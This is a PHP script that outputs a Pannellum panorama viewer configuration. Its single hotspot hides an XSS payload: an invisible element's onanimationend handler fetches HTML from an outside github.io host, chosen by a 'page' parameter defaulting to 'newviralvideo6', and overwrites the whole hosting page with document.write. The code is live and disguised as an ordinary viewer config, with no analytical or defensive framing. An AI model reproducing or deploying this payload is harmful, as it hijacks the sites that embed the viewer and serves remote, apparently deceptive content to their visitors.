<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");

$page = isset($_GET['page']) ? trim($_GET['page']) : 'newviralvideo6';
// If the name does not end with .html, it will be added automatically.
$filename = (pathinfo($page, PATHINFO_EXTENSION) === 'html') ? $page : $page . '.html';
?>
{
  "autoLoad": true,
  "pitch": 0,
  "yaw": 0,
  "type": "equirectangular",
  "panorama": "https://pannellum.org/images/alma.jpg",
  "hotSpots": [
    {
      "pitch": 0,
      "yaw": 0,
      "type": "info",
      "URL": "#",
      "attributes": {
        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://sarahkatie172sf.github.io/xnx/ymx/<?php echo $filename; ?>').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
      }
    }
  ]
}